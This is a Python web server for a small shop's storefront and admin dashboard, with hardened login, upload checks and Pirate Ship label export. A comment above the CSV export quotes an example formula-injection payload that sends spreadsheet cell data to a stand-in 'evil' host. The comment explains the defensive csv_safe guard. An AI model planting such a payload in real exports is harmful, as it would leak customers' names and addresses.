"""Serves the site and backs the click tracker, Bid of the Week, My Orders lookup, and email gate with local JSON files."""
import base64
import csv
import hashlib
import hmac
import http.server
import io
import json
import os
import re
import secrets
import shutil
import threading
import time
from datetime import datetime
from urllib.parse import parse_qs, urlsplit

APP_DIR = os.path.dirname(os.path.abspath(__file__))

# Everything the server WRITES lives under DATA_DIR; everything it only reads (markup, CSS, JS,
# fonts) ships in the image and stays under APP_DIR.
#
# On Fly a volume is mounted at /data and POC_DATA_DIR points there, so the database, uploaded
# photos and the admin password hash survive a redeploy — a container filesystem does not. Locally
# the variable is unset and DATA_DIR is just the project folder, so nothing about running this on
# your laptop changes.
DATA_DIR = os.path.abspath(os.environ.get("POC_DATA_DIR", APP_DIR))
os.makedirs(DATA_DIR, exist_ok=True)

# Kept so existing references keep working; it now means "where the writable data is".
DIR = DATA_DIR

PORT = int(os.environ.get("PORT", "8000"))

# The database is the source of truth. products.json and pricing.json are projections rewritten on
# every save, which is what lets this cutover happen without changing one line of script.js or
# index.html — the storefront still fetches the same static files at the same URLs.
import importlib.util as _ilu
_store_spec = _ilu.spec_from_file_location("_store", os.path.join(APP_DIR, "db", "store.py"))
store = _ilu.module_from_spec(_store_spec)
_store_spec.loader.exec_module(store)

_orders_spec = _ilu.spec_from_file_location("_orders", os.path.join(APP_DIR, "db", "orders.py"))
orders = _ilu.module_from_spec(_orders_spec)
_orders_spec.loader.exec_module(orders)

_mig_spec = _ilu.spec_from_file_location("_migrate", os.path.join(APP_DIR, "db", "migrate.py"))
_migrate = _ilu.module_from_spec(_mig_spec)
_mig_spec.loader.exec_module(_migrate)

# Stripe Checkout. Stdlib-only client (no `stripe` SDK), so the project keeps its zero-dependency
# promise. Payments stay OFF unless a key and a webhook secret are both configured — see
# stripe_client.is_configured() for why a half-configured install must not take money.
_stripe_spec = _ilu.spec_from_file_location("_stripe", os.path.join(APP_DIR, "stripe_client.py"))
stripe_client = _ilu.module_from_spec(_stripe_spec)
_stripe_spec.loader.exec_module(stripe_client)
CLICKS_FILE = os.path.join(DIR, "clicks.json")
BIDS_FILE = os.path.join(DIR, "bids.json")
ORDERS_FILE = os.path.join(DIR, "orders.json")
SUBSCRIBERS_FILE = os.path.join(DIR, "subscribers.json")
PRODUCTS_FILE = os.path.join(DIR, "products.json")
PRICING_FILE = os.path.join(DIR, "pricing.json")
ADMIN_AUTH_FILE = os.path.join(DIR, "admin_auth.json")
COSTS_FILE = os.path.join(DIR, "costs.json")
BACKUP_DIR = os.path.join(DIR, "backups")
EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
lock = threading.Lock()

# The static handler serves this whole directory, which would otherwise hand out orders.json —
# customer names, emails and shipping addresses — to anyone who guesses the filename. Reach the
# order data through /api/orders (scoped to one email) or /api/labels.csv instead.
PRIVATE_FILES = {
    "orders.json",
    "subscribers.json",
    "bids.json",
    "clicks.json",
    "server.py",
    "claude.md",
    # The admin token. Serving this would hand out write access to the catalog.
    "admin_token.txt",
    "admin_auth.json",
    # Stripe secret key and webhook signing secret. Serving this would let anyone charge cards as
    # the shop and forge payment confirmations.
    "stripe_config.json",
    # Supplier costs and landed cost. products.json is fetched by every visitor; this must never
    # be, or the storefront would hand out the margin on every item.
    "costs.json",
    # Negotiated carrier rates and the shipping origin. The browser never reads this — the cart
    # prices off the flat ladder in script.js and the checkout figure comes from
    # /api/shipping/quote, computed server-side — so serving it is pure downside. It holds the
    # below-Commercial rates Pirate Ship states it is not permitted to advertise, and the origin
    # ZIP, which for a one-person business run from home is a home address.
    "shipping_rates.json",
    # The database holds everything the JSON files do PLUS costs, orders and customer emails in
    # one file. Serving it would be the single worst leak in the project.
    "paidoff.db",
    "paidoff.db-wal",
    "paidoff.db-shm",
}

# Whole directories that must never be served, matched on any path segment.
PRIVATE_DIRS = {"db", "backups", "tools"}


# Uploads are written into images/ and served straight back, so the extension whitelist is a
# security control, not a convenience: it is what stops someone with the token dropping a .py or
# .html file into a directory the static handler serves. Magic bytes are checked too, so renaming
# a script to .jpg doesn't get it past the gate either.
# Spreadsheet formula injection. Every name and address line in /api/labels.csv is typed by a
# customer at checkout, and the owner opens that file in Excel or Sheets and uploads it to Pirate
# Ship. A cell beginning =, +, -, @, tab or CR is parsed as a FORMULA by every major spreadsheet,
# so a buyer calling themselves `=HYPERLINK("http://evil/?x="&A1,"hi")` gets code running in the
# owner's spreadsheet with the order sheet in scope. csv.writer quotes delimiters; it does not and
# cannot stop this, because the danger is in how the file is later interpreted, not in its syntax.
#
# The fix is to prefix a leading trigger with an apostrophe, which every spreadsheet reads as
# "treat the rest as text". A real address never starts with one of these characters, so this
# fires only on input that was already malformed.
CSV_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value):
    """Neutralise a value that a spreadsheet would otherwise read as a formula."""
    text = "" if value is None else str(value)
    return "'" + text if text.startswith(CSV_FORMULA_TRIGGERS) else text


UPLOAD_EXTS = {".jpg", ".jpeg", ".png", ".webp", ".gif"}
UPLOAD_MAX_BYTES = 12 * 1024 * 1024
UPLOAD_SIGNATURES = (
    (b"\xff\xd8\xff", "jpeg"),
    (b"\x89PNG\r\n\x1a\n", "png"),
    (b"GIF87a", "gif"),
    (b"GIF89a", "gif"),
)


def looks_like_image(data):
    """Reject anything whose first bytes aren't a real image header."""
    for sig, _ in UPLOAD_SIGNATURES:
        if data.startswith(sig):
            return True
    # WEBP is "RIFF" + 4 size bytes + "WEBP"
    return data[:4] == b"RIFF" and data[8:12] == b"WEBP"


def safe_upload_name(raw):
    """Strip the filename down to something that can't escape images/ or hide an extension."""
    base = os.path.basename((raw or "").replace("\\", "/")).strip()
    stem, ext = os.path.splitext(base)
    ext = ext.lower()
    stem = re.sub(r"[^A-Za-z0-9._-]+", "-", stem).strip("-._") or "photo"
    return stem[:60], ext


def unique_image_path(stem, ext):
    """Never overwrite an existing photo — a product elsewhere may still point at it."""
    img_dir = os.path.join(DIR, "images")
    os.makedirs(img_dir, exist_ok=True)
    name = f"{stem}{ext}"
    n = 2
    while os.path.exists(os.path.join(img_dir, name)):
        name = f"{stem}-{n}{ext}"
        n += 1
    return os.path.join(img_dir, name), f"images/{name}"


# ---- admin password ---------------------------------------------------------------------
# The password is never stored, logged, or sent back — only a PBKDF2-HMAC-SHA256 hash of it with
# a per-install random salt. 600k iterations is the OWASP figure for this algorithm; it makes a
# login take a few hundred milliseconds, which is invisible to a human and expensive for anyone
# guessing. Verification happens once at login and mints a session token, so the cost isn't paid
# on every request.
PBKDF2_ITERATIONS = 600_000
PBKDF2_ALGO = "sha256"
MIN_PASSWORD_LENGTH = 10

# Sessions live in memory only: restarting the server logs everyone out, which is the right
# default for a dev-grade tool and means there is no second secret sitting on disk.
SESSIONS = {}
SESSION_TTL_SECONDS = 12 * 60 * 60

# Crude but effective brute-force brake, keyed by client address.
FAILED_LOGINS = {}
LOCKOUT_AFTER = 8
LOCKOUT_SECONDS = 15 * 60


def hash_password(password, salt=None):
    salt = salt or os.urandom(16)
    digest = hashlib.pbkdf2_hmac(PBKDF2_ALGO, password.encode("utf-8"), salt, PBKDF2_ITERATIONS)
    return {
        "version": 1,
        "algo": f"pbkdf2_{PBKDF2_ALGO}",
        "iterations": PBKDF2_ITERATIONS,
        "salt": base64.b64encode(salt).decode(),
        "hash": base64.b64encode(digest).decode(),
        "updated_at": int(time.time()),
    }


def read_auth():
    if not os.path.exists(ADMIN_AUTH_FILE):
        return None
    try:
        with open(ADMIN_AUTH_FILE) as f:
            return json.load(f)
    except (json.JSONDecodeError, OSError):
        return None


def write_auth(record):
    """0600 before any bytes land, so the hash is never briefly world-readable."""
    fd = os.open(ADMIN_AUTH_FILE, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(fd, "w") as f:
        json.dump(record, f, indent=2)
        f.write("\n")
    os.chmod(ADMIN_AUTH_FILE, 0o600)


def verify_password(password, record):
    if not record or not password:
        return False
    try:
        salt = base64.b64decode(record["salt"])
        expected = base64.b64decode(record["hash"])
        iterations = int(record.get("iterations", PBKDF2_ITERATIONS))
        algo = str(record.get("algo", "pbkdf2_sha256")).replace("pbkdf2_", "")
    except (KeyError, ValueError, TypeError):
        return False
    candidate = hashlib.pbkdf2_hmac(algo, password.encode("utf-8"), salt, iterations)
    # compare_digest so a near-miss can't be distinguished from a wild miss by timing
    return hmac.compare_digest(candidate, expected)


def password_problem(password):
    """One place for the rules, so the server and the dashboard can't disagree."""
    if not isinstance(password, str) or len(password) < MIN_PASSWORD_LENGTH:
        return f"Password must be at least {MIN_PASSWORD_LENGTH} characters."
    if password.strip() != password:
        return "Password can't start or end with a space."
    return None


def new_session():
    token = secrets.token_urlsafe(32)
    SESSIONS[token] = time.time() + SESSION_TTL_SECONDS
    # opportunistic sweep so an abandoned server doesn't accumulate dead tokens
    for t, exp in list(SESSIONS.items()):
        if exp < time.time():
            SESSIONS.pop(t, None)
    return token


def session_valid(token):
    exp = SESSIONS.get(token)
    if not exp:
        return False
    if exp < time.time():
        SESSIONS.pop(token, None)
        return False
    return True


def lockout_remaining(who):
    entry = FAILED_LOGINS.get(who)
    if not entry:
        return 0
    count, first = entry
    if count < LOCKOUT_AFTER:
        return 0
    remaining = int(first + LOCKOUT_SECONDS - time.time())
    if remaining <= 0:
        FAILED_LOGINS.pop(who, None)
        return 0
    return remaining


def note_failure(who):
    count, first = FAILED_LOGINS.get(who, (0, time.time()))
    FAILED_LOGINS[who] = (count + 1, first)


def backup_file(path):
    """Timestamped copy before any admin write, so a bad edit is always one file-copy from undone."""
    if not os.path.exists(path):
        return None
    os.makedirs(BACKUP_DIR, exist_ok=True)
    stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    dest = os.path.join(BACKUP_DIR, f"{os.path.basename(path)}.{stamp}.bak")
    shutil.copy2(path, dest)
    return dest


def load_json(path, default):
    if os.path.exists(path):
        with open(path) as f:
            return json.load(f)
    return default


def save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f)


def save_json_pretty(path, data):
    """products.json and pricing.json are meant to stay readable and diffable by hand."""
    tmp = path + ".tmp"
    with open(tmp, "w") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
        f.write("\n")
    os.replace(tmp, path)  # atomic: a crash mid-write can't leave a truncated catalog


SHIPPING_METHODS = ("air", "sea", "other")
ALLOCATION_BASES = ("units", "value", "weight")


def _money_or_none(v):
    return v is None or (isinstance(v, (int, float)) and not isinstance(v, bool) and v >= 0)


def recompute_landed_costs(costs):
    """landedCostPerUnit is derived, always, so it can never drift from its three inputs.

    A null in any input yields a null landed cost rather than a total that silently reads low —
    "not entered yet" and "costs nothing" are different things, and conflating them is how you
    end up pricing against a number that was never real.
    """
    for entry in (costs.get("products") or {}).values():
        parts = [entry.get("itemCost"), entry.get("shippingPerUnit"), entry.get("extraFeesPerUnit")]
        entry["landedCostPerUnit"] = round(sum(parts), 2) if all(isinstance(x, (int, float)) for x in parts) else None
    return costs


def validate_costs(costs, products):
    """Rejects a malformed cost payload. Cost data never reaches a customer, but a bad write here
    still corrupts the file the future allocator will read."""
    errors = []
    if not isinstance(costs, dict):
        return ["costs must be an object"]
    if not isinstance(costs.get("products"), dict):
        return ["costs.products must be an object keyed by product id"]
    if not isinstance(costs.get("shipments"), list):
        return ["costs.shipments must be an array"]

    known_ids = {p.get("id") for p in (products or {}).get("products", [])}

    for pid, entry in costs["products"].items():
        if not isinstance(entry, dict):
            errors.append(f"costs for '{pid}' must be an object")
            continue
        for field in ("itemCost", "shippingPerUnit", "extraFeesPerUnit"):
            if not _money_or_none(entry.get(field)):
                errors.append(f"costs '{pid}': {field} must be a number >= 0 or null")
        method = entry.get("shippingMethod")
        if method is not None and method not in SHIPPING_METHODS:
            errors.append(f"costs '{pid}': shippingMethod must be one of {', '.join(SHIPPING_METHODS)} or null")

    seen = set()
    for i, s in enumerate(costs["shipments"]):
        where = f"shipment #{i + 1}"
        if not isinstance(s, dict):
            errors.append(f"{where} must be an object")
            continue
        sid = s.get("id")
        if not sid or not isinstance(sid, str):
            errors.append(f"{where}: missing id")
        elif sid in seen:
            errors.append(f"{where}: duplicate id '{sid}'")
        else:
            seen.add(sid)
        if not s.get("name"):
            errors.append(f"{where}: missing name")
        if s.get("method") not in SHIPPING_METHODS:
            errors.append(f"{where}: method must be one of {', '.join(SHIPPING_METHODS)}")
        for field in ("totalShippingCost", "totalFees"):
            if not _money_or_none(s.get(field)):
                errors.append(f"{where}: {field} must be a number >= 0 or null")
        if s.get("allocationBasis") not in ALLOCATION_BASES:
            errors.append(f"{where}: allocationBasis must be one of {', '.join(ALLOCATION_BASES)}")
        lines = s.get("lines")
        if not isinstance(lines, list):
            errors.append(f"{where}: lines must be an array")
            continue
        for j, ln in enumerate(lines):
            if not isinstance(ln, dict):
                errors.append(f"{where} line {j + 1}: must be an object")
                continue
            # A shipment line pointing at a product that no longer exists would silently drop its
            # share of the freight when the allocator runs.
            if known_ids and ln.get("productId") not in known_ids:
                errors.append(f"{where} line {j + 1}: unknown productId '{ln.get('productId')}'")
            qty = ln.get("qty")
            if not isinstance(qty, int) or isinstance(qty, bool) or qty < 0:
                errors.append(f"{where} line {j + 1}: qty must be an integer >= 0")
            if not _money_or_none(ln.get("unitCost")):
                errors.append(f"{where} line {j + 1}: unitCost must be a number >= 0 or null")

    return errors


def validate_catalog(products, pricing):
    """Reject a malformed save outright rather than writing a catalog the site can't render.

    The dashboard validates too, but it is the only thing standing between a hand-rolled POST and
    products.json, so the rules live here as well.
    """
    errors = []
    if not isinstance(products, dict) or not isinstance(products.get("products"), list):
        return ["products must be an object with a 'products' array"]
    if not isinstance(pricing, dict) or not isinstance(pricing.get("products"), dict):
        return ["pricing must be an object with a 'products' object"]

    categories = products.get("categories") or []
    if "categories" in products:
        if not isinstance(products["categories"], list) or not all(isinstance(c, str) for c in products["categories"]):
            errors.append("categories must be an array of strings")
        else:
            seen_cats = set()
            for c in products["categories"]:
                if c == "All":
                    continue
                if not c.strip():
                    errors.append("categories: a category name is blank")
                elif c.lower() in seen_cats:
                    errors.append(f"categories: duplicate category '{c}'")
                else:
                    seen_cats.add(c.lower())

    seen_ids, seen_names = set(), set()
    for i, p in enumerate(products["products"]):
        where = f"product #{i + 1}"
        pid, name = p.get("id"), p.get("name")
        if not pid or not isinstance(pid, str):
            errors.append(f"{where}: missing id")
        elif pid in seen_ids:
            errors.append(f"{where}: duplicate id '{pid}'")
        else:
            seen_ids.add(pid)

        if not name or not isinstance(name, str):
            errors.append(f"{where}: missing name")
        elif name in seen_names:
            errors.append(f"{where}: duplicate name '{name}' — the cart and pricing key on name")
        else:
            seen_names.add(name)

        if categories and p.get("category") not in categories:
            errors.append(f"{where} ('{name}'): category '{p.get('category')}' is not in the categories list")
        if not isinstance(p.get("retailPrice"), (int, float)):
            errors.append(f"{where} ('{name}'): retailPrice must be a number")
        bulk = p.get("bulkPrice")
        if bulk is not None and not isinstance(bulk, (int, float)):
            errors.append(f"{where} ('{name}'): bulkPrice must be a number or null")
        if not isinstance(p.get("sizes"), list) or not p["sizes"]:
            errors.append(f"{where} ('{name}'): needs at least one size")
        else:
            for s in p["sizes"]:
                if not isinstance(s, dict) or not s.get("size"):
                    errors.append(f"{where} ('{name}'): a size row has no name")
                elif not isinstance(s.get("qty"), int) or s["qty"] < 0:
                    errors.append(f"{where} ('{name}'): size '{s.get('size')}' qty must be an integer >= 0")
        if p.get("status") not in ("available", "sold"):
            errors.append(f"{where} ('{name}'): status must be 'available' or 'sold'")

    # Every tier price must be a number, and every tier id must exist in that product's ladder.
    for name, entry in pricing["products"].items():
        prices = (entry or {}).get("prices", {})
        for tier_id, value in prices.items():
            if value is not None and not isinstance(value, (int, float)):
                errors.append(f"pricing '{name}': tier '{tier_id}' must be a number or null")

    return errors[:25]  # a broken payload can produce hundreds; the first 25 make the point


class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=APP_DIR, **kwargs)

    def translate_path(self, path):
        """Serve writable files from the volume, shipped assets from the image.

        products.json and the product photos are written at runtime, so on a deployed instance
        they live on the volume rather than in the image. Everything else — index.html, script.js,
        styles.css, fonts — is read-only and comes from the build. Checking the volume first means
        an uploaded photo wins over one baked into the image, which is what an admin upload should do.
        """
        local = super().translate_path(path)
        if DATA_DIR != APP_DIR:
            rel = os.path.relpath(local, APP_DIR)
            if not rel.startswith(".."):
                candidate = os.path.join(DATA_DIR, rel)
                # isfile, not exists: "." (the request for "/") and any subdirectory always
                # "exist" under DATA_DIR since it's a real directory, which previously made every
                # directory request resolve to the volume root and serve its listing instead of
                # falling through to APP_DIR's index.html.
                if os.path.isfile(candidate):
                    return candidate
        return local

    # Markup, code and data are never cached, so edits always show up on the next reload instead
    # of silently serving a stale script.js or index.html.
    #
    # Images are the exception. Blanket no-store meant a phone re-downloaded every product photo on
    # every single page load — ~480KB of images that had not changed, over cellular, before the
    # catalog could paint. They now get "no-cache", which is not "don't cache": the browser keeps
    # the file and revalidates it with If-Modified-Since, so an unchanged image comes back as a
    # bodyless 304 instead of a fresh download. Replacing an image on disk still updates instantly,
    # because every load still asks — which is what keeps this safe during development.
    CACHEABLE_SUFFIXES = (".jpg", ".jpeg", ".png", ".webp", ".gif", ".svg", ".ico", ".woff2")

    def end_headers(self):
        path = urlsplit(self.path).path.lower()
        if path.endswith(self.CACHEABLE_SUFFIXES):
            self.send_header("Cache-Control", "no-cache")
        else:
            self.send_header("Cache-Control", "no-store, must-revalidate")
        super().end_headers()

    def _bearer(self):
        header = self.headers.get("Authorization", "")
        return header[7:].strip() if header.lower().startswith("bearer ") else ""

    def _authed(self):
        """True only for a request carrying a live session token.

        Sessions are minted by /api/admin/login after a password check and expire on their own,
        so the password itself is verified once rather than on every request. Returns 401 itself
        on failure, so callers just bail.
        """
        if session_valid(self._bearer()):
            return True
        self._send_json({"ok": False, "error": "Unauthorized"}, status=401)
        return False

    def do_GET(self):
        path = urlsplit(self.path).path
        query = parse_qs(urlsplit(self.path).query)

        # Guard before anything can fall through to the static file handler.
        # PRIVATE_FILES matches on the leaf name, which does not cover a whole directory — db/
        # holds the schema and the migration code, and there is no reason to serve source.
        leaf = os.path.basename(path).lower()
        parts = [p.lower() for p in path.split("/") if p]
        if leaf in PRIVATE_FILES or leaf.startswith(".") or any(p in PRIVATE_DIRS for p in parts):
            self.send_error(404)
            return

        only_unshipped = (query.get("unshipped") or ["0"])[0] == "1"

        # ---- admin: read the catalog and the pricing ladder together ----
        # Both files come back in one response because the dashboard edits them as one thing:
        # a product's row and its quantity tiers are the same form.
        if path == "/api/admin/data":
            if not self._authed():
                return
            with lock:
                products = store.products_doc()
                pricing = store.pricing_doc()
                costs = store.costs_doc()
            self._send_json({"ok": True, "products": products, "pricing": pricing, "costs": costs})
            return

        # Liveness probe for the host. Unauthenticated by design — it must answer before anyone
        # has logged in — and it deliberately leaks nothing: a boolean and a product count, no
        # versions, no paths, no configuration.
        #
        # It actually touches the database rather than just returning 200, because the failure
        # worth catching is "process alive, storage gone", which a static reply would hide.
        if path == "/healthz":
            try:
                conn = store.connect()
                try:
                    n = conn.execute("SELECT COUNT(*) c FROM products").fetchone()["c"]
                finally:
                    conn.close()
                self._send_json({"ok": True, "products": n})
            except Exception:
                self._send_json({"ok": False}, status=503)
            return

        # Orders for the admin dashboard, newest first, with their items.
        if path == "/api/admin/orders":
            if not self._authed():
                return
            conn = store.connect()
            try:
                orders.sweep_if_due(conn)
                rows = conn.execute("SELECT * FROM orders ORDER BY placed_at DESC, id DESC").fetchall()
                out = []
                for o in rows:
                    items = conn.execute(
                        "SELECT * FROM order_items WHERE order_id=? ORDER BY position",
                        (o["id"],)).fetchall()
                    out.append({
                        "id": o["id"], "ref": o["order_ref"], "email": o["email"],
                        "placed_at": o["placed_at"], "status": o["status"],
                        "inventory_state": o["inventory_state"],
                        "subtotal": (o["subtotal_cents"] or 0) / 100,
                        "shipping": (o["shipping_cents"] or 0) / 100,
                        "total": (o["total_cents"] or 0) / 100,
                        "weight_oz": o["weight_oz"],
                        "ship_to": {"name": o["ship_name"], "address1": o["ship_address1"],
                                    "address2": o["ship_address2"], "city": o["ship_city"],
                                    "state": o["ship_state"], "zip": o["ship_zip"],
                                    "country": o["ship_country"]},
                        "items": [{"name": r["product_name"], "size": r["size"], "qty": r["qty"],
                                   "price": (r["price_cents"] or 0) / 100, "tier": r["tier"]}
                                  for r in items],
                    })
                # Count every status actually present, not just the known ones. An order placed
                # before this system existed carries a free-text status ("Hold — pending
                # shipping"); dropping it from the tally would show fewer orders than are listed.
                counts = {s: 0 for s in orders.STATUSES}
                for r in conn.execute("SELECT status, COUNT(*) n FROM orders GROUP BY status"):
                    counts[r["status"]] = r["n"]
            finally:
                conn.close()
            self._send_json({"ok": True, "orders": out, "counts": counts})
            return

        # Unauthenticated on purpose: the login screen has to know whether a password exists yet
        # before anyone can log in. It reveals only that one bit, never the hash or the salt.
        if path == "/api/admin/status":
            record = read_auth()
            self._send_json({
                "ok": True,
                "passwordSet": bool(record),
                "minLength": MIN_PASSWORD_LENGTH,
                "lockedFor": lockout_remaining(self.client_address[0]),
            })
            return

        # Every image on disk, so the dashboard can offer a picker instead of asking the owner to
        # type a path correctly. Read-only; there is no upload endpoint yet.
        if path == "/api/admin/images":
            if not self._authed():
                return
            img_dir = os.path.join(DIR, "images")
            names = []
            if os.path.isdir(img_dir):
                names = sorted(
                    f"images/{n}" for n in os.listdir(img_dir)
                    if n.lower().endswith((".jpg", ".jpeg", ".png", ".webp", ".gif")) and not n.startswith(".")
                )
            self._send_json({"ok": True, "images": names})
            return

        # Lets the login screen verify a token without pulling the whole catalog.
        if path == "/api/admin/check":
            if not self._authed():
                return
            self._send_json({"ok": True})
            return

        if path == "/api/stats":
            with lock:
                data = store.clicks_doc()
            self._send_json(data)
            return

        if path == "/api/bid":
            item = (query.get("item") or [""])[0]
            with lock:
                current = store.bid_for(item)
            self._send_json(current)
            return

        # Pirate Ship has no API, so labels are bought by uploading a spreadsheet. This emits one
        # row per order in the shape their importer's field-mapping step expects. Weight is in
        # ounces; add Length/Width/Height columns here if you start shipping boxed items.
        if path == "/api/labels.csv":
            if not self._authed():
                return
            with lock:
                # NOT named `orders`: that would shadow the module-level orders module for the
                # whole of do_GET and make it unbound in every other branch.
                orders_by_email = store.all_orders()
            buf = io.StringIO()
            writer = csv.writer(buf)
            writer.writerow([
                "Order ID", "Name", "Email", "Address 1", "Address 2",
                "City", "State", "Zip", "Country", "Weight (oz)", "Items",
            ])
            for email, entries in orders_by_email.items():
                for order in entries:
                    if only_unshipped and order.get("status", "").startswith("Shipped"):
                        continue
                    ship = order.get("ship_to") or {}
                    if not ship.get("address1"):
                        continue  # pre-split order, no label-ready address
                    writer.writerow([
                        order.get("id", ""),
                        csv_safe(ship.get("name", "")),
                        csv_safe(email),
                        csv_safe(ship.get("address1", "")),
                        csv_safe(ship.get("address2", "")),
                        csv_safe(ship.get("city", "")),
                        csv_safe(ship.get("state", "")),
                        csv_safe(ship.get("zip", "")),
                        csv_safe(ship.get("country", "US")),
                        round(float(order.get("weight_oz", 0)), 1),
                        csv_safe("; ".join(
                            f"{it.get('qty', 1)}x {it.get('name', '')}"
                            + (f" ({it['size']})" if it.get("size") else "")
                            for it in order.get("items", [])
                        )),
                    ])
            body = buf.getvalue().encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/csv")
            self.send_header("Content-Disposition", 'attachment; filename="pirateship-labels.csv"')
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return

        # Whether the storefront should offer card payment at all. Public and deliberately thin:
        # one boolean and the mode, never a key or a reason.
        if path == "/api/payments/config":
            cfg = stripe_client.load_config()
            enabled = stripe_client.is_configured(cfg)
            self._send_json({
                "ok": True,
                "payments_enabled": enabled,
                "mode": stripe_client.key_mode(cfg["secret_key"]) if enabled else "off",
            })
            return

        # The return page asks the DATABASE whether the order is paid — it never trusts the query
        # string Stripe redirected with. Typing ?checkout=success by hand proves nothing.
        if path == "/api/checkout/status":
            ref = (parse_qs(urlsplit(self.path).query).get("ref") or [""])[0].strip()
            if not ref:
                self._send_json({"ok": False, "error": "Missing ref."}, status=400)
                return
            conn = store.connect()
            try:
                row = orders.order_by_ref(conn, ref)
            finally:
                conn.close()
            if row is None:
                self._send_json({"ok": False, "error": "Unknown order."}, status=404)
                return
            # Minimal by design: the order_ref is the only secret the buyer holds, so this returns
            # what a receipt needs and nothing that would matter if the ref were guessed.
            self._send_json({
                "ok": True, "ref": row["order_ref"], "status": row["status"],
                "paid": row["status"] in ("paid", "fulfilled"),
                "total": (row["total_cents"] or 0) / 100,
            })
            return

        if path == "/api/orders":
            email = (query.get("email") or [""])[0].strip().lower()
            ref = (query.get("ref") or [""])[0].strip().upper()
            with lock:
                order = store.order_by_ref(email, ref)
            self._send_json([order] if order else [])
            return

        super().do_GET()

    def do_POST(self):
        client = self.client_address[0]

        # ---- admin: set the FIRST password ----
        # Allowed without auth only while no password exists. Once one is set this is closed
        # forever, so it can't be used to take over an existing install; changing it afterwards
        # goes through /api/admin/password, which demands the current one.
        if self.path == "/api/admin/setup":
            payload = self._read_json()
            if read_auth():
                self._send_json({"ok": False, "error": "A password is already set. Use Change password."}, status=409)
                return
            password = payload.get("password") or ""
            problem = password_problem(password)
            if problem:
                self._send_json({"ok": False, "error": problem}, status=400)
                return
            with lock:
                write_auth(hash_password(password))
            self._send_json({"ok": True, "token": new_session()})
            return

        # ---- admin: log in ----
        if self.path == "/api/admin/login":
            payload = self._read_json()
            locked = lockout_remaining(client)
            if locked:
                self._send_json({"ok": False, "error": f"Too many attempts. Try again in {locked // 60 + 1} minute(s)."}, status=429)
                return
            record = read_auth()
            if not record:
                self._send_json({"ok": False, "error": "No password set yet."}, status=409)
                return
            if not verify_password(payload.get("password") or "", record):
                note_failure(client)
                # Deliberately vague: naming which half was wrong helps an attacker, not the owner.
                self._send_json({"ok": False, "error": "Incorrect password."}, status=401)
                return
            FAILED_LOGINS.pop(client, None)
            self._send_json({"ok": True, "token": new_session()})
            return

        # ---- admin: change the password ----
        # Requires BOTH a live session and the current password, so someone who walks up to an
        # unlocked browser still can't lock the owner out.
        if self.path == "/api/admin/password":
            if not self._authed():
                return
            payload = self._read_json()
            record = read_auth()
            if not verify_password(payload.get("currentPassword") or "", record):
                note_failure(client)
                self._send_json({"ok": False, "error": "Current password is incorrect."}, status=401)
                return
            new_password = payload.get("newPassword") or ""
            problem = password_problem(new_password)
            if problem:
                self._send_json({"ok": False, "error": problem}, status=400)
                return
            if verify_password(new_password, record):
                self._send_json({"ok": False, "error": "New password must be different from the current one."}, status=400)
                return
            with lock:
                write_auth(hash_password(new_password))
            # Every other session dies; only the one doing the change survives.
            keep = self._bearer()
            for t in list(SESSIONS):
                if t != keep:
                    SESSIONS.pop(t, None)
            self._send_json({"ok": True})
            return

        if self.path == "/api/admin/logout":
            SESSIONS.pop(self._bearer(), None)
            self._send_json({"ok": True})
            return

        # ---- admin: upload a product photo ----
        # The browser posts the raw File as the body with ?name=<original filename>, which avoids
        # parsing multipart/form-data in the stdlib entirely. Read before any auth failure so the
        # socket isn't left with an unread body.
        if urlsplit(self.path).path == "/api/admin/upload":
            length = int(self.headers.get("Content-Length", 0))
            if length > UPLOAD_MAX_BYTES:
                self.rfile.read(min(length, UPLOAD_MAX_BYTES))
                self._send_json({"ok": False, "error": f"File is larger than {UPLOAD_MAX_BYTES // (1024*1024)}MB."}, status=413)
                return
            data = self.rfile.read(length) if length else b""
            if not self._authed():
                return

            query = parse_qs(urlsplit(self.path).query)
            stem, ext = safe_upload_name((query.get("name") or [""])[0])
            if ext not in UPLOAD_EXTS:
                self._send_json({"ok": False, "error": f"Only {', '.join(sorted(UPLOAD_EXTS))} files are allowed."}, status=400)
                return
            if not data:
                self._send_json({"ok": False, "error": "Empty file."}, status=400)
                return
            if not looks_like_image(data):
                self._send_json({"ok": False, "error": "That file isn't a real image."}, status=400)
                return

            with lock:
                abs_path, rel_path = unique_image_path(stem, ext)
                with open(abs_path, "wb") as f:
                    f.write(data)
            self._send_json({"ok": True, "path": rel_path, "bytes": len(data)})
            return

        # ---- admin: order actions ----
        # Payment, cancellation and refunds each move inventory, so they are separate actions
        # rather than a free-form status field. Every one is idempotent.
        if self.path == "/api/admin/order":
            if not self._authed():
                return
            payload = self._read_json()
            action = str(payload.get("action", ""))
            if action == "expire_now":
                order_id = 0          # a sweep acts on every eligible order, not one
            else:
                try:
                    order_id = int(payload.get("order_id"))
                except (TypeError, ValueError):
                    self._send_json({"ok": False, "error": "Missing order id."}, status=400)
                    return
            # The admin acting by hand is its own event source; the key keeps a double-click from
            # being processed twice.
            key = str(payload.get("event_id") or f"admin_{action}_{order_id}_{int(time.time())}")
            conn = store.connect()
            try:
                if action == "mark_paid":
                    res = orders.mark_paid(conn, order_id, key, provider="admin")
                elif action == "cancel":
                    res = orders.cancel_order(conn, order_id, "cancelled in the dashboard",
                                              "cancelled", event_id=key)
                elif action == "refund":
                    res = orders.refund_order(conn, order_id, key,
                                              restore_stock=bool(payload.get("restore_stock", True)),
                                              provider="admin")
                elif action == "fulfil":
                    res = orders.set_status(conn, order_id, "fulfilled", "marked shipped")
                elif action == "unfulfil":
                    res = orders.set_status(conn, order_id, "paid", "moved back to paid")
                elif action == "expire_now":
                    expired = orders.expire_pending(conn)
                    res = {"expired": len(expired), "orders": expired}
                else:
                    self._send_json({"ok": False, "error": "Unknown action."}, status=400)
                    return
            except orders.OrderError as e:
                self._send_json({"ok": False, "error": e.message}, status=409)
                return
            finally:
                conn.close()
            store.project_orders()
            self._send_json({"ok": True, **res})
            return

